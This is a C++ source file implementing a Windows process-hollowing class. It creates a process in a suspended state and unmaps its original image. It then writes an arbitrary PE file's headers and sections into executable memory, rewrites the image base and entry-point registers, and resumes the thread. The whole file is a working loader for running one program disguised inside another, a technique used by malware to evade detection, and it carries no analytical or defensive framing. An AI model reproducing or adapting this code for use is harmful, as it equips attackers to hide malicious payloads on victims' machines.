#include "pe_process.hpp"
#include "pe_structs.hpp"

#include <winternl.h>
#pragma comment(lib, "ntdll")

pe_process::pe_process()
{

}

pe_process::~pe_process()
{
		
}

bool pe_process::create_process(const std::string& command_line)
{
	memset(&this->startup_info, 0, sizeof(STARTUPINFOA));
	memset(&this->process_info, 0, sizeof(PROCESS_INFORMATION));

	if (!CreateProcessA(NULL, const_cast<char*>(command_line.c_str()), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &this->startup_info, &this->process_info))
		return false;

	if (!this->process_info.hProcess)
		return false;

	return true;
}

bool pe_process::hollow_process(std::vector<unsigned char>& file_data)
{
	CONTEXT ctx;
	memset(&ctx, 0, sizeof(CONTEXT));

	ctx.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(this->process_info.hThread, &ctx))
		return false;

	unsigned int image_base = 0;

	if (!this->read_process_memory(reinterpret_cast<void*>(ctx.Ebx + 8), &image_base, sizeof(unsigned int)))
		return false;
	
	nt_header* file_headers = reinterpret_cast<nt_header*>(file_data.data() + reinterpret_cast<dos_header*>(file_data.data())->pe_offset);

	if (image_base == file_headers->optional_header.image_base)
	{
		if (!this->unmap_view_of_section(file_headers->optional_header.image_base))
			return false;
	}

	void* remote_image = this->virtual_alloc(file_headers->optional_header.image_base, file_headers->optional_header.image_size);
		
	if (!remote_image)
		return false;
		
	if (!this->write_process_memory(remote_image, file_data.data(), file_headers->optional_header.headers_size))
		return false;
		
	for (std::size_t i = 0; i < file_headers->file_header.section_count; i++)
	{
		section_header* section = reinterpret_cast<section_header*>(reinterpret_cast<unsigned char*>(file_headers) + sizeof(nt_header) + (i * sizeof(section_header)));

		if (!this->write_process_memory(reinterpret_cast<unsigned char*>(remote_image) + section->virtual_address, file_data.data() + section->raw_data_pointer, section->raw_data_size))
			return false;
	}

	if (!this->write_process_memory(reinterpret_cast<void*>(ctx.Ebx + 8), &file_headers->optional_header.image_base, sizeof(unsigned int)))
		return false;

	ctx.Eax = reinterpret_cast<unsigned int>(remote_image) + file_headers->optional_header.entry_point_address;
		
	if (!SetThreadContext(this->process_info.hThread, &ctx))
		return false;

	this->resume();
	return true;
}

void pe_process::resume()
{
	ResumeThread(this->process_info.hThread);
}

HANDLE pe_process::get_process_handle()
{
	return this->process_info.hProcess;
}

unsigned int pe_process::get_process_id()
{
	return this->process_info.dwProcessId;
}

bool pe_process::unmap_view_of_section(unsigned int address)
{
	typedef LONG (WINAPI* NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);
	NtUnmapViewOfSection_t NtUnmapViewOfSection = reinterpret_cast<NtUnmapViewOfSection_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));

	if (!NtUnmapViewOfSection)
		return false;

	if (NtUnmapViewOfSection(this->process_info.hProcess, reinterpret_cast<void*>(address)) < 0)
		return false;

	return true;
}

void* pe_process::virtual_alloc(unsigned int address, std::size_t size)
{
	return VirtualAllocEx(this->process_info.hProcess, reinterpret_cast<void*>(address), size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
}

bool pe_process::read_process_memory(void* destination, void* source, std::size_t size)
{
	return (ReadProcessMemory(this->process_info.hProcess, destination, source, size, NULL) != FALSE);
}

bool pe_process::write_process_memory(void* destination, void* source, std::size_t size)
{
	return (WriteProcessMemory(this->process_info.hProcess, destination, source, size, NULL) != FALSE);
}